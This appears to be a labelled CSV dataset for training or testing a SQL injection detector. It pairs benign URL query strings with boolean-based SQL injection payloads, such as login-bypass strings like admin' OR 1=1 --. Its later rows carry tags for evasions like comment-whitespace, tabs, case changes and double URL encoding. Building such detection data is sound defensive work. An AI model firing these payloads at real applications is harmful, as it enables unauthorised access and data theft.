article_id%3D13&author%3Dadmin_viewer,0,normal,standard,partially_encoded,NORMAL_010,aaec618ab6f289f9b1f91b53bc6f9b72,7a3082b5fa2cdcc8b76b7dcd093aa459,37
product_id%3D10&qty%3D1,0,normal,standard,partially_encoded,NORMAL_012,84d13ee65f6aaa5ff7e2dffcf6dd695f,754cccadc8fcd36cc4825d97064d3241,23
query%3Dlaptop&lang%3Den,0,normal,standard,partially_encoded,NORMAL_011,a51e210e8ccbd6b9f9de4f67d10c573b,6b5da2876c99357072bd65cf479f7843,24
username=bob_smith&password%3Dpassword123&Login=Login,0,normal,standard,partially_encoded,NORMAL_016,dd6236d88e3f6b4096ad02ca8c156f24,ecc3c00b10fe9f19bbf8317302bb7e46,53
page%253D39%2526limit%253D10,0,normal,standard,double_encoded,NORMAL_002,a1ccc35a3c97e45019c8bcf80a681a4c,0ad1d474dd9c33288ab37b46e05c0d8f,28
username=user123&password=20&Login=Login,0,normal,standard,raw,NORMAL_017,52280d4d3e28240cd2909b203c7aeea9,c1ba81e60db301644beba66656a90a35,40
filter=active&page=10,0,normal,standard,raw,NORMAL_009,770e6382b787de0d06711b0721ed1b46,770e6382b787de0d06711b0721ed1b46,21
article_id%253D45%2526author%253Dguest,0,normal,standard,double_encoded,NORMAL_010,03545a39340b5415e26bcc2f00dd4e55,5adb65e6059e7042bf81af5d06d4d20c,38
id%3D7%26Submit%3DSubmit,0,normal,standard,url_encoded,NORMAL_001,eedd8fc58d07774a4e2c2a9e73084285,f359e09ad7a3e4f1ce22608fa806ae7f,24
article_id%3D32&author%3Duser123,0,normal,standard,partially_encoded,NORMAL_010,2ddcd96678be3c458fda463d2713843f,0cfc1c5eabf967c18001bf9601880e9f,32
filter%3Dactive&page%3D38,0,normal,standard,partially_encoded,NORMAL_009,576b535e33138af7d1b1dc743fff452c,272a71615f6b97ed843615f3d9a476f5,25
category%3Dbooks%26sort%3Dpopularity,0,normal,standard,url_encoded,NORMAL_004,aac427f9fe0724d85426722a8204fc01,6b75428ae1e8e9f4ce8b28b54dfe4792,36
username%3Dbob_smith&password%3D28&Login%3DLogin,0,normal,standard,partially_encoded,NORMAL_017,fe940f04595b4a3f7cae40ff12da6aab,c0e2af099f8fdc1e4856f910ba0d9e3a,48
id%3D43&Submit%3DSubmit,0,normal,standard,partially_encoded,NORMAL_001,f12a8ce1adb12fa9d389d7884fe8f371,b5d073a8c0881386c76b07b9f5694ae1,23
page%3D3%26limit%3D10,0,normal,standard,url_encoded,NORMAL_002,6a0b1604997729ece0e55d28ad0f5846,366cd7edc9e03c560610f87a569f9e34,21
product_id%3D2%26qty%3D1,0,normal,standard,url_encoded,NORMAL_012,50a06b736524321937204185dd78a67b,ebbf7d53c35d5bb55cb108094ef99993,24
category%3Dclothing&sort=name_asc,0,normal,standard,partially_encoded,NORMAL_004,c2c24b4148b679d16d3519ed01115c97,b0f89197ce960da92464c4bae8f90ef8,33
username%3Dguest&password=98&Login=Login,0,normal,standard,partially_encoded,NORMAL_017,828f2304c9904a170c4a2c6e46c265ff,74e18894c0aa56067349338730131ec3,40
query%253Dcybersecurity%2526lang%253Den,0,normal,standard,double_encoded,NORMAL_011,1f92fd0d4a26431db5f30edb161d7abd,8ede4643d31a3162ea6a3aeaf1ab251f,39
username%3Dbob_smith&password=35&Login%3DLogin,0,normal,standard,partially_encoded,NORMAL_017,7e4180dc61be1f5eaafe7d4a1dafd405,08d7236acb66df3406fc81e9611acb18,46
article_id%253D44%2526author%253Duser123,0,normal,standard,double_encoded,NORMAL_010,8e234a06b12608470e88fec4b47d4fbd,5ded7095dc5ef8aec94560e1984d33cf,40
article_id=25&author=user123,0,normal,standard,raw,NORMAL_010,368898012d668fed7ff06fd7ef193dd1,368898012d668fed7ff06fd7ef193dd1,28
product_id=39&qty=1,0,normal,standard,raw,NORMAL_012,dc846990d1a076ce54795c58e27828f3,dc846990d1a076ce54795c58e27828f3,19
article_id%3D6%26author%3Djohn_doe,0,normal,standard,url_encoded,NORMAL_010,e60155e09500358cc7fab5d3dd4410d8,383d49bfe86e10f526efdf11d3cd64fe,34
query%253Dpython%2526lang%253Den,0,normal,standard,double_encoded,NORMAL_011,813d6c1ad18883dc4aa21109c6e962f1,c79a48349fd39fcd30a28f3473194ab1,32
username%3Dbob_smith%26password%3D5%26Login%3DLogin,0,normal,standard,url_encoded,NORMAL_017,9f0a3016cda0f73c22a850da59fe57a3,a84697d898ae4f0e374039dbebb0f1df,51
page%3D22%26limit%3D10,0,normal,standard,url_encoded,NORMAL_002,00ebd8cceb95925a7ea7edb18dba0f8c,0cd284a4d14c94bbd2f30af05a6dd49d,22
id=8&Submit=Submit,0,normal,standard,raw,NORMAL_001,ea13785cc067ad800a9c0d40ccf7a642,cc541d8f1506b595fbaa25e948c0dc19,18
category%3Dtoys%26sort%3Dpopularity,0,normal,standard,url_encoded,NORMAL_004,560e0ea64103cb0899384f96b93f64e8,e05e54363415054d7591f0eeec8a9072,35
username=user123&password=7&Login=Login,0,normal,standard,raw,NORMAL_017,136dfae20bb6e9029363978e1c22f175,8f7c4b1512b32e37e2afc532fd560285,39
username%3Dbob_smith&password=password123&Login%3DLogin,0,normal,standard,partially_encoded,NORMAL_016,03cf416855c6a8b99077e494f13a5c4f,084f6dcc02fea8ec2824532e9cd0e1a7,55
product_id%3D45%26qty%3D1,0,normal,standard,url_encoded,NORMAL_012,ace3c715e1b69907b2862fdd6c689aba,913143df200a80648cc0c09dba257048,25
id=26&Submit=Submit,0,normal,standard,partially_encoded,NORMAL_001,3cc91fbb6a72fe27ce522277065988b8,5fa5c8709fd73e11c9c0cbc513cef117,19
article_id%3D33%26author%3Dbob_smith,0,normal,standard,url_encoded,NORMAL_010,fd30e78942f714bbe8fc6e58b6b36fbf,f3796010fdd8f5350b435a137f3ba016,36
id%3D40%26Submit%3DSubmit,0,normal,standard,url_encoded,NORMAL_001,8107f058e4a40d6c170b7d0178e2b8fc,015f2658fc66680cff996a9263963fa0,25
product_id=11&qty=1,0,normal,standard,raw,NORMAL_012,ae2046bc8614a6525d2975a27d9ae384,ae2046bc8614a6525d2975a27d9ae384,19
id%3D50&Submit%3DSubmit,0,normal,standard,partially_encoded,NORMAL_001,18409206c76ae6869b28d90dc5da4ada,5077bec32de502a9e3054a04a0003869,23
page%253D17%2526limit%253D10,0,normal,standard,double_encoded,NORMAL_002,a87018fad7ec2e5ad2136306dcccf12c,ed8839ec8353f94cf82a2d915e4c55c8,28
user%253Dadmin_viewer,0,normal,standard,double_encoded,NORMAL_005,d4cde153afcdf67d3a6d3e4a3c571c51,6941ba44a57cc059187e4d2c18503aeb,21
username%3Djohn_doe&password=password123&Login=Login,0,normal,standard,partially_encoded,NORMAL_016,da2b73178bbfb317c7491752a604b305,cff34071bd729080c06904a63bcb0c4d,52
article_id=45&author%3Dadmin_viewer,0,normal,standard,partially_encoded,NORMAL_010,5feee62f11e243911cf80ffa3bac9d39,c02d24222092efa19498d41858331cae,35
article_id%3D6&author=user123,0,normal,standard,partially_encoded,NORMAL_010,011c93efdd2d9c5412848e1d4469c852,ff953912f552b6d5086fbb2937140270,29
id%253D28%2526Submit%253DSubmit,0,normal,standard,double_encoded,NORMAL_001,52479025674df610fdb0a4ccfecbf6cc,a54f8974286f023d8cafdc0a1547e4c6,31
product_id%3D36%26qty%3D1,0,normal,standard,url_encoded,NORMAL_012,e21ca1355fe9afd0f362722ff9967436,8292ffa0db7dd3260e5e6b2278eec8b3,25
product_id%3D6%26qty%3D1,0,normal,standard,url_encoded,NORMAL_012,47d2b48d259174ab601f913a2fed3a77,60793d896d046de9f6d8dd1b258680c8,24
username%3Dbob_smith&password=32&Login%3DLogin,0,normal,standard,partially_encoded,NORMAL_017,631d2d4da9f1ce22f338a71beb99abd1,a54cde25c6b733257d22a852c629e213,46
username=admin_viewer&password=37&Login=Login,0,normal,standard,raw,NORMAL_017,c9043bb8134f59408d6fed726dc7d935,3e233eae2330cbf0c64e5b073ce60081,45
id%3D15&Submit=Submit,0,normal,standard,partially_encoded,NORMAL_001,7132e1a56c847b9bf244fb8f6090bc26,85ff826f92d7eecb0ada29557db83ab4,21
article_id%3D19%26author%3Dadmin_viewer,0,normal,standard,url_encoded,NORMAL_010,b5fd1f8a3120a5ff7e1064374de74ad5,d27ab92a2166fd317fb4bcd70dd3d74b,39
page=45&limit%3D10,0,normal,standard,partially_encoded,NORMAL_002,a60d48fe1d9395dc232528bbb3d37f4b,355d6fc7d226e596306c335a85a77627,18
product_id%3D4%26qty%3D1,0,normal,standard,url_encoded,NORMAL_012,168a7ce4a8dafc39456cfd08c3bf15be,d444ca29845ca4985c489b1222af05c2,24
filter%253Dactive%2526page%253D36,0,normal,standard,double_encoded,NORMAL_009,e4743e2f6e8d1417b22b7884af1c9c11,19742cc49f70d1323d018aa476082ff7,33
category%3Dtoys&sort%3Dnewest,0,normal,standard,partially_encoded,NORMAL_004,239a8ca2a986ed5425c473a413f10d72,1f0164d7a6e001d832cb60d6e359cd2c,29
category%253Delectronics%2526sort%253Dpopularity,0,normal,standard,double_encoded,NORMAL_004,17318e30112cab6a9d9077cbf4928837,06155f0438d6396f8319b4e36b5d8bab,48
username=alice&password%3D42&Login%3DLogin,0,normal,standard,partially_encoded,NORMAL_017,6c26a40e01f356a6f5aad29829ba5171,6a8848e8b4d038abffabbe41cf548210,42
search%253Dphone,0,normal,standard,double_encoded,NORMAL_003,211b5454fd8617d58f125549d8b411b7,e66745f1ab741b5284682e66de417b5f,16
article_id=44&author=john_doe,0,normal,standard,partially_encoded,NORMAL_010,40ca3ffe6f2dbee2f5fcdf721899d517,40ca3ffe6f2dbee2f5fcdf721899d517,29
id%3D13%26Submit%3DSubmit,0,normal,standard,url_encoded,NORMAL_001,c8f962dccd192a9452cd605de8272b6d,86e149af67f8c4339f00a023ce89c969,25
article_id=7&author=admin_viewer,0,normal,standard,raw,NORMAL_010,ab33f040a5a45db3373e356b130f45f6,ab33f040a5a45db3373e356b130f45f6,32
article_id%3D3%26author%3Djohn_doe,0,normal,standard,url_encoded,NORMAL_010,635d6d4eaff125722186477660751fb6,4ce501d512081c4ba6af4f2c2ea139b4,34
page%3D41%26limit%3D10,0,normal,standard,url_encoded,NORMAL_002,0be7c87bc3ac52bebe2620d21e07e643,564014ee4c1b29c2efb11557cc0ac077,22
article_id%3D35%26author%3Dadmin_viewer,0,normal,standard,url_encoded,NORMAL_010,2635056c1cdf489948a073f1f0174487,4072e6b32ee40bfa6f228b120170d1d4,39
article_id=6&author=bob_smith,0,normal,standard,partially_encoded,NORMAL_010,578d90ce436b03d78424dd7ae20de9fc,578d90ce436b03d78424dd7ae20de9fc,29
filter=active&page=17,0,normal,standard,raw,NORMAL_009,6a730c53954b97e86428251f2e9e50ee,6a730c53954b97e86428251f2e9e50ee,21
id%3D10%26Submit%3DSubmit,0,normal,standard,url_encoded,NORMAL_001,581fe011793f76e3cc7ae9ec5c2b8370,d210658c1c86657564d76ee0316edda9,25
category%3Dsports&sort%3Dpopularity,0,normal,standard,partially_encoded,NORMAL_004,cd03ab2d5be2116e2f9675d703d7ef62,9a864e13f56b0ccb1d0463a4e28a8416,35
username=john_doe&password=64&Login=Login,0,normal,standard,raw,NORMAL_017,cdbe632aa7f54ece236ba4f205b4c21d,653d61a7b5b0d52dad8d954867590b53,41
category=home&sort=popularity,0,normal,standard,raw,NORMAL_004,c1cfc79fa489afa259a056b2519dce3f,c1cfc79fa489afa259a056b2519dce3f,29
article_id=44&author=admin_viewer,0,normal,standard,partially_encoded,NORMAL_010,1c7de9c59cddf5bcc6506c99bc843b49,1c7de9c59cddf5bcc6506c99bc843b49,33
filter%3Dactive%26page%3D41,0,normal,standard,url_encoded,NORMAL_009,53399b97034e35087685ea1097a38dcc,8c6a05547d5f8c526a25b15eb7cbcabe,27
page%3D5%26limit%3D10,0,normal,standard,url_encoded,NORMAL_002,cf0cac235bff52d5c782d96a957c3e6a,37c28b93b6e7db75e4b0bcec8f7b5850,21
article_id%3D13%26author%3Dguest,0,normal,standard,url_encoded,NORMAL_010,0cc4512bc4f9469e4436e34f50710ee3,9b0cc3e725e8585105e5a868c74cd17a,32
category%3Dsports&sort=price_desc,0,normal,standard,partially_encoded,NORMAL_004,2fb9f13c3d60457ec457547329f49ebc,1ea0b95b3ee4b75762264d63b25cbd2b,33
filter=active&page%3D19,0,normal,standard,partially_encoded,NORMAL_009,20eaeb6fadd82f9b15127afd7f6b7341,9429a429bda76fad269b7564574ec25b,23
username=john_doe&password=84&Login=Login,0,normal,standard,raw,NORMAL_017,ff4353d397917604bf88afee4dfea784,bdf328a9880a477e5455e038b6014b6f,41
filter=active&page=37,0,normal,standard,raw,NORMAL_009,5d97476747230e3410e6f552258cfd8e,5d97476747230e3410e6f552258cfd8e,21
filter%253Dactive%2526page%253D4,0,normal,standard,double_encoded,NORMAL_009,4943c06e0c11d70f0425c5cc4c7a58b9,2973f81565bb01f41e6587315ca2b32b,32
id%253D2%2526Submit%253DSubmit,0,normal,standard,double_encoded,NORMAL_001,98656f8881514c6ef6137e06f042f21e,94311bb8b1998c4c1eb513391675718c,30
article_id%3D38%26author%3Dbob_smith,0,normal,standard,url_encoded,NORMAL_010,a3d94b23159b73fd54890f0f6e7b5497,ede55e563b2ea9bc54050f224bf9cdb5,36
username%253Djohn_doe%2526password%253D50%2526Login%253DLogin,0,normal,standard,double_encoded,NORMAL_017,c0aab754b5b1d9c7e2e6f8ba40d528d8,2782f3e94e301ebe3ebd03f1e68f41d8,61
article_id%253D33%2526author%253Dbob_smith,0,normal,standard,double_encoded,NORMAL_010,06919ff125c0919339d98b1ecd89ca5f,57649ed4e9c23266c6ef757bd5b83139,42
article_id%253D38%2526author%253Dalice,0,normal,standard,double_encoded,NORMAL_010,9408bc77d82181e8778e0f9ee452b67f,c43b08972d84de39908ece9aba0449e3,38
page%3D20&limit%3D10,0,normal,standard,partially_encoded,NORMAL_002,4b0eaa0f5b50462a2d3da75f1d55ff86,e1998198bb1296d3eff5e6dedd0a7058,20
category=sports&sort=popularity,0,normal,standard,raw,NORMAL_004,e51c189b57d7d0f59d185eff4d4e46b2,e51c189b57d7d0f59d185eff4d4e46b2,31
username=user123&password=10&Login=Login,0,normal,standard,raw,NORMAL_017,04494b3651ad9faa49e38e86d8d51e34,e14a662845b6ff7f16f800a8e8355c5c,40
article_id=31&author=admin_viewer,0,normal,standard,raw,NORMAL_010,82bfe5d944029a691c273baffcac77c8,82bfe5d944029a691c273baffcac77c8,33
article_id=47&author%3Dguest,0,normal,standard,partially_encoded,NORMAL_010,7b3d0be95dce4195d2987a495762fa08,9854ab1d42c58b4986e93c0ee1437f27,28
article_id=29&author=admin_viewer,0,normal,standard,raw,NORMAL_010,f72b4bc11881fcc92544d50576e3a7e5,f72b4bc11881fcc92544d50576e3a7e5,33
id%3D1%27%2520OR%2520NOT%2520%28%27a%27%3D%27a%27%29%2520--,1,sqli_boolean,case_var|comment_dash_dash|ws_url_space,url_encoded,SQLI_BOOLEAN_007,951669846b257c87cdaf8ee812d2c0f6,7f819cf4294420bdbec837ba9a77a79f,59
username%3Dadmin%27+OR+CHAR%2897%29%3D%27a%27+%23,1,sqli_boolean,comment_hash,url_encoded,SQLI_BOOLEAN_003,d1c546b084989239057ec50a770f730a,8e1aa3a1a78b006b88c66cde39abbf4d,49
id%253D1%2527%252Band%252B2%253E1%252B--%252B-,1,sqli_boolean,case_var|comment_dash_dash_space|ws_plus,double_encoded,SQLI_BOOLEAN_002,799455ef383c4d5885b0e3ab6f81dbef,e6f5abaa9e62a5818760326358e8e55e,46
id=%271'%20OR%20%272'%3D%272',1,sqli_boolean,case_var|ws_url_space,partially_encoded,SQLI_BOOLEAN_005,49ee5ea8bc7618ac38b513c0a6fb8cff,4f5de2a20c19d184365e1a97b3559728,29
id=1'/**/OR/**/23=23/**/%23,1,sqli_boolean,comment_url_hash|ws_comment_ws,raw,SQLI_BOOLEAN_006,e4966208f325acca52bb5f35d70fe757,fb67351ff32fd2dde6596dfc36b67c16,27
id%253D1%2527%2Bor%2B30%253D30%2B%253B--%2B-,1,sqli_boolean,case_var|comment_semicolon_comment,double_encoded,SQLI_BOOLEAN_006,e94938bf582abe875cb035c2b73e9817,c59a513334d2a81ce77fb2187d28440f,44
id=1%27+OR+CHAR(97)%3D'a%27+;-- -,1,sqli_boolean,comment_semicolon_comment,partially_encoded,SQLI_BOOLEAN_001,c56d8fc9f5919e8fa09d9d6ac5d11b5c,81e0c44d323536d08be04c5144ed0ead,33
id%3D1%27%2F%2A%2A%2FOR%2F%2A%2A%2F26%3D26%2F%2A%2A%2F%2F%2A,1,sqli_boolean,comment_block_comment|ws_mixed_ws,url_encoded,SQLI_BOOLEAN_006,45e13b7bd63239746945494d875be739,7e733b73e3e6393047004a33c5efdeb7,60
id%3D1%27+OR+NOT+%28ASCII%28%27A%27%29%3D65%29+%2523,1,sqli_boolean,case_var|comment_url_hash|ws_space,url_encoded,SQLI_BOOLEAN_007,bfee6ffbefe86a5fc66675d8b750cae2,a3f544bf05fc6e7c38eff77e9ee63368,52
username=admin'+OR LENGTH(%27test%27)%3D4 /*,1,sqli_boolean,comment_block_comment,partially_encoded,SQLI_BOOLEAN_003,2dacc7433b926d3cd6f08d9af2ed76c1,0308d204650f374fe5e0dd6965b78f69,44
id%253D1%2527%252BOR%252B%25287%253D7%2529%252B%252523,1,sqli_boolean,comment_url_hash|ws_plus,double_encoded,SQLI_BOOLEAN_004,6abb53f5b601f899263aa843e6fa0c5a,3e1b9c9a792e655b9094f35d46facc7d,54
id%253D1%2527%252BAND%252B100%253C200%252B%2523,1,sqli_boolean,comment_hash|ws_plus,double_encoded,SQLI_BOOLEAN_002,552c1f2d558bad96fb221287f727b2c3,bbb5633e4e69c9ddf6ddcb1938df88db,47
id%253D1%2527%2BOR%2BNOT%2B%25281%253D1%2529%2B%252523,1,sqli_boolean,case_var|comment_url_hash,double_encoded,SQLI_BOOLEAN_007,7a50de722c314a41db52dfdeacda9e94,15426aaffe5b46c4bcc0445831c66765,54
id%3D1%27 Or (CHAR(97)=%27a')+%2F%2A,1,sqli_boolean,case_var|comment_block_comment,partially_encoded,SQLI_BOOLEAN_004,db678176cda54400fd8925a354355df2,54b14198e2999a6b64b623a70c723623,36
id=1' Or CHAR(97)='a' --,1,sqli_boolean,case_var|comment_dash_dash,raw,SQLI_BOOLEAN_001,eddb7ac5636171f78ec68dbda1b2f31a,a7a74d95dbd9a426da2747f4b49167d3,24
id%253D1%2527%2BOR%2B14%253D14%2B--,1,sqli_boolean,case_var|comment_dash_dash,double_encoded,SQLI_BOOLEAN_006,e619089b6c511d73774f689148b4db06,c78b02c31404bd2842a32697bfa36c11,35
id%253D1%2527%252520Or%252520LENGTH%2528%2527test%2527%2529%253D4%252520--,1,sqli_boolean,case_var|comment_dash_dash|ws_url_space,double_encoded,SQLI_BOOLEAN_001,6fdb2883ff2ee48930bb9d0316b60c01,eb3cb6efac514773a828bd7d524a216d,74
id='1' OR '8'='8',1,sqli_boolean,ws_space,raw,SQLI_BOOLEAN_005,648969530c3fbef8d9206d3b2cb79af3,664fea6c232c0315202362ef43f99d8a,17
id%3D1%27+OR+ASCII%28%27A%27%29%3D65+%2F%2A,1,sqli_boolean,comment_block_comment,url_encoded,SQLI_BOOLEAN_001,8e02d3146b65e128f92a8856995b5fde,8888ac9981095d9c75f22225043ff98d,43
id%3D1%27+OR+%282%3E1%29+--+-,1,sqli_boolean,case_var|comment_dash_dash_space,url_encoded,SQLI_BOOLEAN_004,fc90135db5da404a94c7aa62dfc4f384,5b0c4d552a8f508913eca41b90d2aa9b,29
id%3D1%27%2520AND%25207%3D7%2520--,1,sqli_boolean,comment_dash_dash|ws_url_space,url_encoded,SQLI_BOOLEAN_002,516934e53a4a407d4e8f4cce2d3b90f5,d1e8bb19502b1fbc23ef7bc3b0fd02d8,34
username%3Dadmin%27%09OR%09LENGTH%28%27test%27%29%3D4%09--%09-,1,sqli_boolean,comment_dash_dash_space|ws_tab,url_encoded,SQLI_BOOLEAN_003,e38042431e9212bec8d8e231a87d6ac5,15d6d738a8dd420be564ae88c77d2b42,62
id='1'%20OR%20'27'='27',1,sqli_boolean,ws_mixed_ws,raw,SQLI_BOOLEAN_005,fdb290ed2ae02ecc7c54743cfa082689,47e8d457a7bad6742c02eec8ac673922,23
id%3D%271%27+Or+%273%27%3D%273%27,1,sqli_boolean,case_var,url_encoded,SQLI_BOOLEAN_005,a1748a6229d62c9dac62aede54ed6a90,c823e32a23bc2b1e552f75b9f4c76bf1,33
id=1'%20WHERE%201=1%20OR%20ASCII('A')=65%20--,1,sqli_boolean,comment_dash_dash|ws_mixed_ws,raw,SQLI_BOOLEAN_008,66012e440b1bca73c2147bca7bd34180,999a38127d1625084b61fc9ff22a5d95,45
id%253D1%2527%252520OR%252520CHAR%252897%2529%253D%2527a%2527%252520--,1,sqli_boolean,comment_dash_dash|ws_url_space,double_encoded,SQLI_BOOLEAN_001,cd402f977a2f03ce83f9cc96c421c445,8cbf00b49b482b24e923f3440b18f041,70
id=1' Or+LENGTH('test%27)%3D4+--+-,1,sqli_boolean,case_var|comment_dash_dash_space|ws_space,partially_encoded,SQLI_BOOLEAN_001,6e905f428d064d1d6c2cd320aa46c45e,5186ddb345a2bdac015b71b9d533f236,34
id%3D%271%27%09OR%09%2767%27%3D%2767%27,1,sqli_boolean,ws_tab,url_encoded,SQLI_BOOLEAN_005,ae6e33fe10062a42214a8e6a63f50e90,5b3c92f535ea86b96f716c5710968f33,39
id%3D1%27+Or (1%3D1) --,1,sqli_boolean,case_var|comment_dash_dash,partially_encoded,SQLI_BOOLEAN_004,aadfd1fbd2f529bd3994e0153eb00a6f,2767befedc0daab8a2f47f9ef3b0376a,23
id=1' WHERE 1=1 OR ASCII('A')=65 %23,1,sqli_boolean,comment_url_hash,raw,SQLI_BOOLEAN_008,613cd55f454ac16ab1c3e8efda0dbfd9,fef200fd9278f49b05eb3abe9ecdd9f1,36
id=1'  Or  (LENGTH('test')=4)  %23,1,sqli_boolean,case_var|comment_url_hash|ws_multi_space,raw,SQLI_BOOLEAN_004,d577cbde3f20f61b3c914c1d9eca46db,bb3fde83957d16c52b12770939926f55,34
id%3D1%27+Where+1%3D1+or %27a%27%3D'a%27+--,1,sqli_boolean,case_var|comment_dash_dash,partially_encoded,SQLI_BOOLEAN_008,4d6461459cf4c4c18790c7cfd5c3c551,c88531a4f43c1f140eb97af68c995ef6,43
id=1%27 WHERE+1=1+OR+7%3D7 %3B--+-,1,sqli_boolean,comment_semicolon_comment,partially_encoded,SQLI_BOOLEAN_008,4dd981427dc33806d0067cb23ca2c814,e49499f5f92f0bb6aaa943921e2a88e4,34
id%253D%25271%2527%2B%2Bor%2B%2B%252748%2527%253D%252748%2527,1,sqli_boolean,case_var|ws_multi_space,double_encoded,SQLI_BOOLEAN_005,f2558fff99cede520b6019c107978a60,3fc7662217500121383f797d4a4e5e57,61
username%253Dadmin%2527%252BOR%252B%2527a%2527%253D%2527a%2527%252B%252523,1,sqli_boolean,case_var|comment_url_hash|ws_plus,double_encoded,SQLI_BOOLEAN_003,11b273bd78946418b47caf922a824d55,6badfbbc1e56fa573833ad2fb1cdd198,74
id%3D1%27%20or%2042=42%20%3B--%20-,1,sqli_boolean,case_var|comment_semicolon_comment|ws_url_space,partially_encoded,SQLI_BOOLEAN_006,272f5fe49888ed4d63b1f724a9052b63,d07e8d21be468a4a079e8bdf57d25111,34
id%3D1%27%2520OR%2520LENGTH%28%27test%27%29%3D4%2520%3B--%2520-,1,sqli_boolean,case_var|comment_semicolon_comment|ws_url_space,url_encoded,SQLI_BOOLEAN_001,81b939c8fbe7fd417f81fee4e84bbb1f,174b7df7f7a189977d51f15cf55fb62c,63
id%3D1%27+or+93%3D93+--+-,1,sqli_boolean,case_var|comment_dash_dash_space|ws_space,url_encoded,SQLI_BOOLEAN_006,1f8485d2d45e68c096171edaf0087985,7a4d1c5b700f52c688f4163c56c6f447,25
id%253D1%2527%2BOR%2B41%253D41%2B%2523,1,sqli_boolean,comment_hash,double_encoded,SQLI_BOOLEAN_006,66fbc864974dfa87969d563edbbec705,d584656cd545495edb61853ab2f0c563,38
username=admin'  OR  1=1  ;--  -,1,sqli_boolean,comment_semicolon_comment|ws_multi_space,raw,SQLI_BOOLEAN_003,7bf264cae0d2fbfc94487504734d1a8e,cc21972fca96d6dda764abf365b4b125,32
username%253Dadmin%2527%2BOR%2B%2527a%2527%253D%2527a%2527%2B%253B--%2B-,1,sqli_boolean,comment_semicolon_comment,double_encoded,SQLI_BOOLEAN_003,63f0271b210a9576f118c89ff947e56c,b907dc0a50f652d964c7b0e74e944a52,72
id%253D%25271%2527%2BOR%2B%252771%2527%253D%252771%2527,1,sqli_boolean,case_var,double_encoded,SQLI_BOOLEAN_005,5d18e0096ffe3a84b8eb769cfeb68cb1,409fcbc47e962fdc508abc5e98a61845,55
id%3D1%27+OR+NOT+%28LENGTH%28%27test%27%29%3D4%29+%2523,1,sqli_boolean,comment_url_hash,url_encoded,SQLI_BOOLEAN_007,d8bbd6e82feed77724f98f46f026570d,388009e959c50c244b265ad581251de7,55
id%253D1%2527%252BOR%252B99%253D99%252B%2523,1,sqli_boolean,comment_hash|ws_mixed_ws,double_encoded,SQLI_BOOLEAN_006,0e0c09ccd5a209cbdde57b99e27e7c84,a727f110f93cc0b344f427bd64ff284b,44
id%3D1'+or (7%3D7) %2F%2A,1,sqli_boolean,case_var|comment_block_comment,partially_encoded,SQLI_BOOLEAN_004,9b3709530391634c1f6d9f536ba4c492,7451f74b44d621e021209d784e06bb18,25
id=1%27/%2A*%2FOR%2F%2A%2A%2F35=35/%2A*%2F;--%2F%2A%2A%2F-,1,sqli_boolean,comment_semicolon_comment|ws_mixed_ws,partially_encoded,SQLI_BOOLEAN_006,c5ebdf9051d87d25c9683b9850539045,0b8e73493f459dc53e2ba911cd0546dc,58
id='1'	or	'77'='77',1,sqli_boolean,case_var|ws_tab,raw,SQLI_BOOLEAN_005,f3b34a21f76452c3857fcdd03109e982,54648b8a8583886782c07683f966e1bf,19
id='1' OR '71'='71',1,sqli_boolean,case_var,raw,SQLI_BOOLEAN_005,3cc8bc865a3acf13e3dd39f1be2ecc97,ad77f31e83cd7f705179cbf6463b527a,19
id%3D1%27 OR (2%3E1)+--,1,sqli_boolean,comment_dash_dash,partially_encoded,SQLI_BOOLEAN_004,b38e354eff112248e53fdfeccebd54e7,725243ac1b9285d3262a5ce556860047,23
id%253D%25271%2527%252BOr%252B%252720%2527%253D%252720%2527--,1,sqli_boolean,case_var|comment_dash_dash|ws_plus,double_encoded,SQLI_BOOLEAN_005,00fb74062d56cd9c749d4a4b616d2ea5,4a39ada615b0acbf41cf85d8d3c3153a,61
id=1%27+AND+CHAR(97)=%27a%27+%23,1,sqli_boolean,comment_url_hash,partially_encoded,SQLI_BOOLEAN_002,58f64a88c2ef26fcdffe5453e5fad0ac,d9a63c9283e4f9f4c547cfe0515fbc0b,32
id%3D1%27+where+1%3D1+Or+100%3C200+%2F%2A,1,sqli_boolean,case_var|comment_block_comment,url_encoded,SQLI_BOOLEAN_008,9fbec3f9a0c025927c56e6fbe2462449,12f76749152a85ee9acd77649599c8c3,41
id%253D%25271%2527%2BOR%2B%252787%2527%253D%252787%2527,1,sqli_boolean,standard,double_encoded,SQLI_BOOLEAN_005,fa73d74ec41873c9a2b2c108b55d5bc2,5c10cc2a03d4a61c098607fe783bfbdd,55
id%3D1%27+OR+%28%27a%27%3D%27a%27%29+%23,1,sqli_boolean,case_var|comment_hash,url_encoded,SQLI_BOOLEAN_004,d50ea3c136d6039146667c862af53cac,d0a6a77ec8f1dec6518768fd976ca635,40
id=1' OR 3=3 #,1,sqli_boolean,comment_hash,raw,SQLI_BOOLEAN_006,f83ce0ebca0353e0bdc61a119fd41454,a62e3f122914db32419907b9948b2dd5,14
username%3Dadmin%27+OR+100%3C200+%3B--+-,1,sqli_boolean,comment_semicolon_comment,url_encoded,SQLI_BOOLEAN_003,5b6449fd8eec9c7f803ccc2d14e85329,1a99de36dab6532d38cfe15f72f427fb,40
id=1'+and+100<200+--,1,sqli_boolean,case_var|comment_dash_dash|ws_plus,raw,SQLI_BOOLEAN_002,89296b5eb06cb90dc15189aa42e4dcc5,89296b5eb06cb90dc15189aa42e4dcc5,20
id=1'+ OR +(LENGTH(%27test%27)=4)+ %3B--++-,1,sqli_boolean,comment_semicolon_comment|ws_multi_space,partially_encoded,SQLI_BOOLEAN_004,f66f6eb941e139fb4e75fcc98913a6b4,b00b8c781efb186b4f02ac6bdec61a15,43
username=admin' OR 2>1 #,1,sqli_boolean,case_var|comment_hash,raw,SQLI_BOOLEAN_003,20452094bcb9974c21bd8bf4e3ac2312,020f570875031034fd8843e018c580aa,24
id%3D%271%27+OR+%2761%27%3D%2761%27,1,sqli_boolean,ws_plus,partially_encoded,SQLI_BOOLEAN_005,cc0302573d882c6489588d9fd2354bf2,f6b4f8953adbb26c36d3436a73492865,35
id%3D1'%2F%2A%2A%2Fwhere/%2A%2A%2F1=1%2F*%2A%2FOr%2F%2A%2A%2F2%3E1%2F%2A%2A/%3B--/%2A*%2F-,1,sqli_boolean,case_var|comment_semicolon_comment|ws_comment_ws,partially_encoded,SQLI_BOOLEAN_008,c34f91e543b5cc109531ea00931b13f1,33ca67c523c51e85d9e0a502a1229b00,90
id=1'/**/OR/**/100<200/**/;--/**/-,1,sqli_boolean,comment_semicolon_comment|ws_comment_ws,raw,SQLI_BOOLEAN_001,1c48935fd34886a335e67ef934784ec7,5459e217c4e1567e43daea8a6b97cbc0,34
